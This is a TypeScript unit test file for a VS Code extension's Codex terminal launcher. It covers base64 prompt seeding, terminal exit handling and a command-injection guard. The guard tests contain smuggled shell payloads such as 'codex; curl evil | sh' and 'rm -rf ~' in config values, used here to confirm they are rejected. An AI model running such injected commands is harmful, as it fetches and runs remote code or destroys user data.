/**
 * skillRunner.codexInteractive.test.ts
 *
 * Tests for Codex interactive-mode parity (#4024):
 * - buildCodexInteractiveLaunchCommand() quote-safe TUI seeding
 * - runStageSkillInteractive() Codex branch launches the TUI in a VSCode
 *   terminal (no child process) and reports interactive mode.
 *
 * @see Issue #4024 - Codex interactive-mode parity in the VSCode extension
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

vi.mock("vscode", () => {
  const terminal = {
    name: "mock-terminal",
    show: vi.fn(),
    sendText: vi.fn(),
    dispose: vi.fn(),
    exitStatus: undefined as { code: number | undefined } | undefined,
  };
  const closeListeners: Array<(t: unknown) => void> = [];
  return {
    workspace: {
      workspaceFolders: [{ uri: { fsPath: "/test/workspace" } }],
    },
    window: {
      terminals: [],
      createTerminal: vi.fn(() => terminal),
      onDidCloseTerminal: vi.fn((cb: (t: unknown) => void) => {
        closeListeners.push(cb);
        return { dispose: vi.fn() };
      }),
      showWarningMessage: vi.fn().mockResolvedValue(undefined),
    },
    extensions: { getExtension: vi.fn(() => null) },
    // test hooks
    __terminal: terminal,
    __closeListeners: closeListeners,
  };
});

vi.mock("fs", () => ({
  existsSync: vi.fn(() => true),
  readFileSync: vi.fn(
    () => `---
name: test-skill
allowed-tools: Read Write Edit Bash
---
# Test Skill
`
  ),
  writeFileSync: vi.fn(),
  unlinkSync: vi.fn(),
}));

// Keep every real SDK export (validateModelForAdapter, PipelineStage, …) but
// make the Codex steering/MCP provisioners inert so this unit test never touches
// the real ~/.codex/config.toml or AGENTS.md (they have their own SDK tests).
vi.mock("@nightgauge/sdk", async () => {
  const actual = await vi.importActual<Record<string, unknown>>("@nightgauge/sdk");
  return {
    ...actual,
    CodexContextGenerator: class {
      generateSync() {
        return "/test/workspace/AGENTS.md";
      }
      generate() {
        return Promise.resolve("/test/workspace/AGENTS.md");
      }
      cleanupSync() {}
      cleanup() {
        return Promise.resolve();
      }
    },
    CodexMcpProvisioner: class {
      provisionSync() {
        return null;
      }
      provision() {
        return Promise.resolve(null);
      }
    },
  };
});

vi.mock("../../src/utils/configPathResolver", () => ({
  resolveConfigPathSync: vi.fn(() => ({
    path: "/test/workspace/.nightgauge/config.yaml",
    isLegacy: false,
    exists: false,
  })),
  logDeprecationWarning: vi.fn(),
}));

vi.mock("../../src/utils/incrediConfig", async () => {
  const actual = await vi.importActual<Record<string, unknown>>("../../src/utils/incrediConfig");
  return {
    ...actual,
    getAuthProvider: vi.fn(() => "max"),
    getExecutionAdapter: vi.fn((): string => "codex"),
    getStageMcpTools: vi.fn(() => []),
    getMcpToolsConfig: vi.fn(() => []),
    getCodexCliCommand: vi.fn((): string => "codex"),
  };
});

vi.mock("../../src/services/RepositoryContextLoader", () => ({
  RepositoryContextLoader: {
    getInstance: vi.fn(() => ({
      getCurrentRepository: vi.fn().mockReturnValue(null),
      getWorkingDirectory: vi.fn().mockReturnValue("/test/workspace"),
    })),
  },
}));

import {
  buildCodexInteractiveLaunchCommand,
  runStageSkillInteractive,
  killAllActiveProcesses,
} from "../../src/utils/skillRunner";
import * as vscode from "vscode";

const vscodeHooks = vscode as unknown as {
  __terminal: {
    sendText: ReturnType<typeof vi.fn>;
    show: ReturnType<typeof vi.fn>;
    dispose: ReturnType<typeof vi.fn>;
    exitStatus: { code: number | undefined } | undefined;
  };
  __closeListeners: Array<(t: unknown) => void>;
};
const mockTerminal = vscodeHooks.__terminal;
/** Simulate the VSCode terminal closing (the `; exit` path) with an exit code. */
function closeTerminal(code: number | undefined): void {
  mockTerminal.exitStatus = code === undefined ? undefined : { code };
  for (const cb of vscodeHooks.__closeListeners) cb(mockTerminal);
}

describe("buildCodexInteractiveLaunchCommand (#4024)", () => {
  it("decodes into a var, rm's the temp file, launches codex, then exits", () => {
    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt-5.4", "/tmp/codex-abc.b64");
    expect(cmd).toBe(
      `P="$(openssl base64 -d -A -in '/tmp/codex-abc.b64')"; ` +
        `rm -f '/tmp/codex-abc.b64'; ` +
        `codex --model gpt-5.4 "$P"; exit`
    );
  });

  it("ends in `; exit` so the terminal closes on Codex exit (#1) and rm's the seed file (#2)", () => {
    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt-5.4", "/tmp/p.b64");
    expect(cmd.endsWith("; exit")).toBe(true);
    expect(cmd).toContain("rm -f '/tmp/p.b64'");
  });

  it("omits the --model flag when no model is given", () => {
    const cmd = buildCodexInteractiveLaunchCommand("codex", undefined, "/tmp/p.b64");
    expect(cmd).toContain(`codex "$P"; exit`);
    expect(cmd).not.toContain("--model");
  });

  it("honors a custom codex CLI command", () => {
    const cmd = buildCodexInteractiveLaunchCommand("/opt/codex", "gpt-5.5", "/tmp/p.b64");
    expect(cmd).toContain("/opt/codex --model gpt-5.5 ");
  });

  it("the seed is base64 (no raw prompt content), so quotes/backticks cannot break the arg", () => {
    // The command never embeds raw prompt text — only the b64 file path — so a
    // prompt containing `"`/`` ` ``/`$` is inert in the shell command.
    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt-5.4", "/tmp/p.b64");
    // The only ${...}-style construct is the safe "$P" expansion of decoded text.
    expect(cmd).toContain('"$P"');
  });

  it("REJECTS a codexCmd with shell metacharacters (command-injection guard)", () => {
    // A malicious .nightgauge/config.yaml on a cloned repo could set this.
    expect(() =>
      buildCodexInteractiveLaunchCommand("codex; curl evil | sh", "gpt-5.4", "/tmp/p.b64")
    ).toThrow(/Unsafe Codex CLI command/);
    expect(() =>
      buildCodexInteractiveLaunchCommand("codex $(rm -rf ~)", undefined, "/tmp/p.b64")
    ).toThrow(/Unsafe/);
    expect(() =>
      buildCodexInteractiveLaunchCommand("codex foo", undefined, "/tmp/p.b64")
    ).toThrow();
  });

  it("DROPS a model with shell metacharacters rather than interpolating it", () => {
    const cmd = buildCodexInteractiveLaunchCommand("codex", "gpt; rm -rf ~", "/tmp/p.b64");
    expect(cmd).not.toContain("rm -rf");
    expect(cmd).not.toContain("--model");
  });

  it("accepts an absolute path as codexCmd", () => {
    expect(() =>
      buildCodexInteractiveLaunchCommand("/usr/local/bin/codex", "gpt-5.4", "/tmp/p.b64")
    ).not.toThrow();
  });
});

describe("runStageSkillInteractive - Codex TUI branch (#4024)", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    killAllActiveProcesses();
  });

  it("launches the Codex TUI in a terminal seeded with the prompt", () => {
    const onMode = vi.fn();
    const onStderr = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onMode, onStderr });

    expect(vi.mocked(vscode.window.createTerminal)).toHaveBeenCalledTimes(1);
    const createArg = vi.mocked(vscode.window.createTerminal).mock.calls[0][0] as {
      name: string;
      cwd: string;
    };
    expect(createArg.name).toContain("Codex");
    expect(createArg.name).toContain("#42");

    expect(mockTerminal.show).toHaveBeenCalled();
    const sent = mockTerminal.sendText.mock.calls[0][0] as string;
    expect(sent).toContain("openssl base64 -d -A -in");
    // model resolved + validated for codex (#4021)
    expect(sent).toContain("--model");

    expect(onMode).toHaveBeenCalledWith("interactive");
  });

  it("returns a terminal-backed handle (no child process) that is interactive", () => {
    const handle = runStageSkillInteractive("feature-dev", 42, {});
    expect(handle.isInteractive).toBe(true);
    expect(handle.process).toBeNull();
    expect(typeof handle.writeToStdin).toBe("function");
    // writeToStdin forwards into the terminal
    expect(handle.writeToStdin!("hello")).toBe(true);
    expect(mockTerminal.sendText).toHaveBeenCalledWith("hello");
  });

  it("does NOT spawn the claude CLI for the codex adapter", () => {
    // (No spawn mock is configured here; if the codex branch fell through to the
    // claude piped-stdio path it would call spawn('claude', …) and throw.)
    expect(() => runStageSkillInteractive("feature-dev", 42, {})).not.toThrow();
  });

  it("(#1) fires onComplete with success when the terminal closes with exit 0", () => {
    const onComplete = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onComplete });
    expect(onComplete).not.toHaveBeenCalled(); // not until the terminal closes
    closeTerminal(0);
    expect(onComplete).toHaveBeenCalledTimes(1);
    expect(onComplete.mock.calls[0][0]).toMatchObject({ success: true, exitCode: 0 });
  });

  it("(#1) fires onComplete with failure on a non-zero terminal exit", () => {
    const onComplete = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onComplete });
    closeTerminal(1);
    expect(onComplete.mock.calls[0][0]).toMatchObject({ success: false, exitCode: 1 });
  });

  it("(#1) onComplete fires exactly once even if the terminal-close event repeats", () => {
    const onComplete = vi.fn();
    runStageSkillInteractive("feature-dev", 42, { onComplete });
    closeTerminal(0);
    closeTerminal(0);
    expect(onComplete).toHaveBeenCalledTimes(1);
  });

  it("(#7) kill() reports failure (aborted), not success", () => {
    const onComplete = vi.fn();
    const handle = runStageSkillInteractive("feature-dev", 42, { onComplete });
    handle.kill();
    expect(mockTerminal.dispose).toHaveBeenCalled();
    expect(onComplete).toHaveBeenCalledTimes(1);
    expect(onComplete.mock.calls[0][0]).toMatchObject({ success: false });
  });

  it("ABORTS (no terminal) when codex.cli_command is malicious (injection guard)", async () => {
    const { getCodexCliCommand } = await import("../../src/utils/incrediConfig");
    // Persistent override: the prereq probe also reads getCodexCliCommand, so a
    // one-shot would be consumed before the launch helper sees it.
    vi.mocked(getCodexCliCommand).mockReturnValue("codex; curl evil | sh");
    try {
      const onComplete = vi.fn();
      const onError = vi.fn();
      runStageSkillInteractive("feature-dev", 42, { onComplete, onError });

      expect(vi.mocked(vscode.window.createTerminal)).not.toHaveBeenCalled();
      expect(onError).toHaveBeenCalled();
      expect(onComplete.mock.calls[0][0]).toMatchObject({ success: false });
    } finally {
      vi.mocked(getCodexCliCommand).mockReturnValue("codex");
    }
  });
});
